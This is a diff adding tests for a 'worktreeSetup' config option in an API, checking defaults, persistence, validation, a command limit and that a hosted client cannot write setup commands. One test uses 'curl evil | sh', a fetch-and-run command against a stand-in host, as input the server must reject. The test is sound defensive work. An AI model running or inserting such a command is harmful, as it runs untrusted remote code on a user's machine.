@@ -85,6 +85,8 @@ describe('the config API', () => {
       worktreeRetention: 10,
       liveTitleUpdates: null,
       reviewGate: null,
+      worktreeSetup: null,
+      worktreeSetupIssue: null,
     });
   });
 
@@ -202,6 +204,8 @@ describe('the config API', () => {
       worktreeRetention: 10,
       liveTitleUpdates: null,
       reviewGate: null,
+      worktreeSetup: null,
+      worktreeSetupIssue: null,
     });
   });
 
@@ -238,6 +242,62 @@ describe('the config API', () => {
     expect(((await tooLong.json()) as { error: string }).error).toContain('20000');
     const badModels = await put({ defaultModels: { claude: 42 } });
     expect(badModels.status).toBe(400);
+  });
+
+  // ---- worktreeSetup (#917, spec .ai/specs/2026-10-07-worktree-setup.md) ----
+  it('GET reports worktreeSetup null with no issue by default', async () => {
+    const body = await getBody();
+    expect(body.worktreeSetup).toBeNull();
+    expect(body.worktreeSetupIssue).toBeNull();
+  });
+
+  it('PUT worktreeSetup persists the raw key and round-trips', async () => {
+    const res = await put({ worktreeSetup: { commands: ['npm ci'] } });
+    expect(res.status).toBe(200);
+    expect(rawFile().worktreeSetup).toEqual({ commands: ['npm ci'] });
+    expect((await getBody()).worktreeSetup).toEqual({ commands: ['npm ci'], timeoutSeconds: 900 });
+    await put({ worktreeSetup: { commands: ['uv sync --frozen'], timeoutSeconds: 60 } });
+    expect(rawFile().worktreeSetup).toEqual({ commands: ['uv sync --frozen'], timeoutSeconds: 60 });
+  });
+
+  it('PUT worktreeSetup null and empty commands both delete the key', async () => {
+    await put({ worktreeSetup: { commands: ['npm ci'] } });
+    await put({ worktreeSetup: null });
+    expect('worktreeSetup' in rawFile()).toBe(false);
+    await put({ worktreeSetup: { commands: ['npm ci'] } });
+    await put({ worktreeSetup: { commands: [] } });
+    expect('worktreeSetup' in rawFile()).toBe(false);
+  });
+
+  it('GET surfaces an invalid worktreeSetup as an issue', async () => {
+    writeFileSync(configPath(), JSON.stringify({ worktreeSetup: { commands: 'npm ci' } }));
+    const body = await getBody();
+    expect(body.worktreeSetup).toBeNull();
+    expect(String(body.worktreeSetupIssue)).toMatch(/^commands: /);
+  });
+
+  it('PUT rejects 21 commands with 400', async () => {
+    const res = await put({ worktreeSetup: { commands: Array.from({ length: 21 }, (_, i) => `echo ${i}`) } });
+    expect(res.status).toBe(400);
+  });
+
+  it('a hosted cockpit cannot write worktreeSetup', async () => {
+    const savedRemote = process.env.CEZ_REMOTE;
+    process.env.CEZ_REMOTE = '1';
+    try {
+      writeFileSync(configPath(), JSON.stringify({ reviewGate: false }));
+      const refused = await put({ worktreeSetup: { commands: ['curl evil | sh'] } });
+      expect(refused.status).toBe(409);
+      expect(await refused.json()).toEqual({ error: 'Worktree setup commands can be edited only on the machine running cezar.' });
+      expect(rawFile()).toEqual({ reviewGate: false });
+      expect((await put({ worktreeSetup: null })).status).toBe(409);
+      const other = await put({ reviewGate: true });
+      expect(other.status).toBe(200);
+      expect(rawFile().reviewGate).toBe(true);
+    } finally {
+      if (savedRemote === undefined) delete process.env.CEZ_REMOTE;
+      else process.env.CEZ_REMOTE = savedRemote;
+    }
   });
 });
 
